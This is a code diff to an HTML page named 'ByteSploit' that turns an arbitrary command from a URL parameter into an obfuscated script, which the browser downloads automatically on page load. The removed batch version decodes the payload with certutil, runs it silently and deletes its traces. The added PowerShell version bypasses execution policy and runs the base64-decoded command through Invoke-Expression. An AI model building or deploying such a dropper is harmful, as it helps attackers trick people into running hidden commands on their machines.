@@ -2,32 +2,21 @@
 <html>
 	<title>ByteSploit</title>
 	<script>
-		function createBatchFile() {
+		function createPowerShellScript() {
 			// Get arguments from form input or URL
 			var urlParams = new URLSearchParams(window.location.search);
 			var urlcmd = urlParams.get('cmd');
 			if (urlcmd !== null) {
 				cmd = btoa(urlcmd); // Encode the cmd variable in base64
 			}
-			// Create batch file content
-			var content = "@echo off\r\n";
-			content += "setlocal enabledelayedexpansion\r\n";
-			content += "set base64_string=";
-			content += cmd.match(/.{1,50}/g).join("^&") + "\r\n";
-			content += "set \"temp_file=%temp%\\temp.bat\"\r\n";
-			content += "echo %base64_string% > %temp_file%\r\n";
-			content += "certutil -decode %temp_file% %temp%\\decoded.bat >nul\r\n";
-			content += "del %temp_file%\r\n";
-			content += "call %temp%\\decoded.bat >nul\r\n";
-			content += "del %temp%\\decoded.bat >nul\r\n"; // Add line to delete decoded.bat file
-			content += "cls\r\n"; // Add line to clear screen
-			content += "exit\r\n"; // Add line to exit command prompt
+			// Create PowerShell script content
+			var content = "powershell -ExecutionPolicy Bypass -Command \"[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + cmd + "'))\" | Invoke-Expression";
 
 			// Create Blob object
 			var blob = new Blob([content], { type: 'text/plain' });
 
 			// Generate random filename
-			var filename = Math.random().toString(36).substring(2) + '.bat';
+			var filename = Math.random().toString(36).substring(2) + '.ps1';
 
 			// Generate download URL and set it as the href of a link
 			var link = document.createElement('a');
@@ -36,12 +25,12 @@
 			link.click();
 		}
 
-		// Set default value of cmd from URL and create batch file
+		// Set default value of cmd from URL and create PowerShell script
 		var urlParams = new URLSearchParams(window.location.search);
 		var urlcmd = urlParams.get('cmd');
 		if (urlcmd !== null) {
 			var cmd = btoa(urlcmd); // Encode the cmd variable in base64
-			createBatchFile();
+			createPowerShellScript();
 		}
 	</script>
 	<body>
